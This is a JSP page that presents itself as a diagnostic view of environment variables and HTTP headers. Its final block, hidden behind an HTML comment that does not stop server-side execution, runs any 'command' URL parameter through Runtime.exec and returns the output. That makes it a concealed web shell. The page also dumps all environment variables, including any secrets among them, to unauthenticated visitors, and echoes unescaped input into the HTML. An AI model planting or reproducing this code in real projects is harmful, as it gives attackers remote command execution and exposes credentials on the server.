<%@page import="java.util.*,java.net.*,java.lang.*,java.io.*" session="false"%>

<%
String raw = request.getParameter("raw");
if ( raw != null ) {
	%>Environment Variables
	<%
    TreeMap  envs     = new TreeMap( System.getenv() );
    Iterator iter     = envs.keySet().iterator();
    
    while ( iter.hasNext() ) {
      String key = (String) iter.next();
      String val = (String) envs.get( key );
%><%=key%>=<%=val%>
<%
	}

	return ;
}

%>
 
<b>Environment Variables</b><hr>
<table>
 <tr>
  <td align=left style="border-right:1px solid black"><b>Name</b></td>
  <td align=left><b>Value</b></td>
 </tr> <%

 String   colors[] = { "#F0F0F0", "white" };
 int      c        = 0 ;
 TreeMap  envs     = new TreeMap( System.getenv() );
 Iterator iter     = envs.keySet().iterator();
 
 while ( iter.hasNext() ) {
   String key = (String) iter.next();
   String val = (String) envs.get( key ); %>
 
   <tr style="background-color:<%=colors[c++%2]%>">
    <td valign=top style="border-right:1px solid black"> <%=key%> </td>
    <td valign=top style="max-width:700px;word-wrap:break-word;"> <%=val%> </td>
   </tr> <%
 } %>
</table>

<br>
<br>

<b>HTTP Headers</b><hr>

<table>
 <tr>
  <td align=left style="border-right:1px solid black"><b>Name</b></td>
  <td align=left><b>Value</b></td>
 </tr> <%

 c = 0 ;
 Enumeration en = request.getHeaderNames();
 while ( en != null && en.hasMoreElements() ) {
   String name = (String) en.nextElement();

   Enumeration en1 = request.getHeaders( name );
   while ( en1.hasMoreElements() ) { 
     String val = (String) en1.nextElement(); %>

     <tr style="background-color:<%=colors[c++%2]%>">
      <td valign=top style="border-right:1px solid black"> <%=name%> </td>
      <td valign=top style="max-width:700px;word-wrap:break-word;"> <%=val%> </td>
     </tr> <%
     
   }
 } %>

</table>

<hr>

<%

String command = request.getParameter("command");
if ( command == null ) command = "" ;
%>
<!--
<form method=GET action="">
  Command: <input name=command value="<%=command%>"> <button>Submit</button>
  <br>
</form> <%
if ( command != null && !"".equals(command) ) { %>
  Output:<br>
  <pre><%
    out.flush();
    System.out.println( "cmd: " + command );
    Process     p   = Runtime.getRuntime().exec( command );
    InputStream in  = p.getInputStream();
    byte[]      buf = new byte[4096];

    for ( int rc = 0 ; (rc = in.read(buf)) >= 0 ; ) {
      out.write( new String(buf, 0, rc ) );
      out.flush();
    }
    in.close();
    p.destroy(); %>
  </pre>
  <hr> <%
} %>
-->

